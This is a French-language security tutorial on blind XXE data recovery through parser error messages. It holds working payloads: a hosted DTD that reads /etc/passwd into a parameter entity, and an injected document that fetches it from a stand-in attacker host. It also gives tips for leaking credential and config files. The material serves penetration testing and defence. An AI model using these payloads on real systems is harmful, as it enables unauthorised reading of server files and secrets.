---
title: "Récupération de données XXE aveugle basée sur les erreurs"
description: "Une entité paramètre qui alimente le contenu d'un fichier dans un chemin SYSTEM invalide force une erreur de parsing dont le message fuite le fichier."
keywords:
  - XXE basé sur les erreurs
  - XXE aveugle
  - entité paramètre
  - fuite d'erreur de parsing
  - divulgation de fichier
---

# Messages d'erreur

Quand le parseur résout les entités mais que rien de parsé n'est reflété, le propre **rapport d'erreurs** du parseur devient le canal d'extraction : un échec forcé intègre le contenu d'un fichier dans une chaîne d'erreur fatale. De nombreux parseurs XML incluent la valeur fautive dans cette chaîne, et si elle atteint le client, dans une trace de pile, un champ d'erreur JSON ou une réponse journalisée, l'attaquant peut arranger l'erreur pour qu'elle transporte le contenu d'un fichier cible. La forme portable ci-dessous récupère quand même une courte DTD externe via HTTP, donc elle nécessite un accès sortant pour cette seule récupération ; quand même cela est bloqué, la variante en DTD locale déplace la même chaîne de déclarations sur un fichier déjà présent sur le disque et ne nécessite aucun réseau du tout.

## La technique

La charge utile lit le fichier dans une entité paramètre, puis l'utilise pour construire une seconde entité qui référence un chemin qui ne peut pas exister. Le contenu du fichier devient une partie de ce chemin, et l'erreur « ressource introuvable » du parseur renvoie le tout.

Hébergez ceci comme la DTD externe `evil.dtd` :

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Le document injecté l'intègre :

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.example/evil.dtd">
  %xxe;
]>
<foo>bar</foo>
```

La séquence à l'intérieur de la DTD importe. `%file;` capture le contenu du fichier. `%eval;` est une déclaration dont le corps, après l'expansion de `%file;`, définit `%error;` comme une entité SYSTEM pointant vers `file:///nonexistent/` suivi du contenu du fichier. `&#x25;` encode le `%` pour que la déclaration d'entité paramètre interne soit formée au bon moment plutôt que consommée trop tôt. Quand `%error;` est résolue, le parseur tente d'ouvrir un chemin tel que `file:///nonexistent/root:x:0:0:root:/root:/bin/bash...` et échoue, produisant une erreur comme :

```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin ...
```

La première ligne du fichier (et parfois davantage, selon la façon dont le parseur tronque le chemin) se trouve désormais à l'intérieur du message d'exception. Chaque requête fuite la portion du fichier qui tient dans le chemin rapporté.

## Variante locale uniquement

Quand la seule récupération de `evil.dtd` est elle aussi bloquée, la DTD externe doit disparaître. La même structure de déclarations est placée dans le sous-ensemble interne là où le parseur permet les entités paramètres dans les déclarations de balisage, ou, plus portablement, combinée avec une DTD sur disque comme décrit dans la technique en DTD locale. Le canal du message d'erreur lui-même n'a jamais besoin du réseau ; il a seulement besoin que le parseur fasse remonter l'erreur. Cela en fait le repli quand la réflexion, l'exfiltration hors bande et même une récupération de DTD sont toutes indisponibles mais que des erreurs verbeuses fuitent encore vers le client.

## Notes pratiques

La fuite est partielle et en forme de chemin : les sauts de ligne et les caractères illégaux dans un nom de fichier tronquent souvent le contenu capturé, donc cela récupère des fichiers courts ou des fragments ligne par ligne plutôt que des binaires entiers. Lire `/etc/hostname`, `/etc/passwd`, de courts fichiers de configuration et les premières lignes de fichiers d'identifiants est l'usage typique. Là où le fichier complet est nécessaire et qu'une quelconque sortie existe, préférez plutôt l'exfiltration hors bande avec l'encodage base64 de `php://filter`.

## Outils

- **XXEinjector** : automatisation de l'extraction basée sur les erreurs via une DTD hébergée.
- **Burp Repeater** : injection de la référence de DTD et lecture des chaînes d'erreur fuitées.
- Tests manuels avec une charge utile d'entité paramètre qui force une erreur de parsing.

## Références

- [OWASP: XML External Entity (XXE) Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [PayloadsAllTheThings: XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
